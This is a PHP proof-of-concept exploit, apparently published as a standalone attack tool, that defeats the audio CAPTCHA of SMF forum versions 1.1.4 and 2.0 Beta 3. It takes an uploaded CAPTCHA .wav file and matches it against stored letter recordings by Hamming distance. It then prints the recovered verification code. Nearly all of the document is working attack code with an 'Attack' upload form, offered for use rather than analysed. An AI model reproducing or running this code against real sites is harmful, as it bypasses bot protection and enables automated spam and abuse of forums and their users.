<?php
//<center>Welcome to Cracking CAPTCHA with Bioinformatics!</center><br>
//print_r($_FILES[capt]);
if(!isset($_FILES[capt])){
	print '
	<html>	
		<form method=POST  enctype="multipart/form-data" >
			Affects: <a href=http://www.simplemachines.org/download/index.php?thanks;filename=smf_1-1-4_install.zip>SMF 1.1.4<a>
			and
			<a href=http://www.simplemachines.org/download/index.php?thanks;filename=smf_2-0-beta3p_install.zip>2.0 Beta 3<a><br><br>
			 upload the .wav file:<br>
			<input type="file" name="capt"><br>
			(This is the type of file this exploit needs: http://localhost/index.php?action=verificationcode;rand=23cda5b6613d5b4ceb09dab18fa224a4;format=.wav;format=.wav)<br>
			<br>
			<input type="submit" value="Attack">
		</form>
	</html>
	';
}else{
	set_time_limit(0);
	$start=microtime(true);
	include("math.php");
	$algo=new SeqMatch();
	
	$cap=file_get_contents($_FILES[capt]['tmp_name']);
	Print "File Uploaded,  starting the attack.<br>";

	//Lets Get Fuzzy
	$sense=128;
	$len=512;

	//Load Sounds:
	for($l=0;$l<=25;$l++){
		$a_con=file_get_contents("./sound/".chr($l+97).".english.wav");
		$letters[$l]=substr($a_con, strpos($a_con, 'data') + 8);
		$size[$l]=strlen($letters[$l]);
	}
	print "Clean Letters have been loaded into memory.<br>";
	$calc=0;
	print "using a fuzz value of:".$sense." and a comparison length of:".$len."<br>";
	$found='';
	for($chars=0;$chars<5;$chars++){
		$dist=$sense;
		for($x=0;$dist>=$sense&&$x<=25;$x++){//
			$calc++;
			$dist=$algo->hamdist(substr($letters[$x],0,$len),substr($cap,$curpos,$len));

		}
		if($dist<$sense){
			$x--;
			$found.=chr($x+97);
			print "<BR>Found the letter:".chr($x+97)." <br>At position:".$curpos." of ".strlen($cap)."<br>with distance:".$dist;
			$curpos=$curpos+$size[$x]+5600; //is the smallest "white space"  between charicters in the sound file.
		}else{//we didn't find the location of the letter...
			$chars--;
			$curpos++;
		}
	}
	print "<br>Used $calc Hamming distance calculations in this attack.<br>";

	$time=microtime(true)-$start;
	print "Compleated in ".$time." Seconds<br><br>";
	
	print "CODE:<b>$found</b>";
}
?>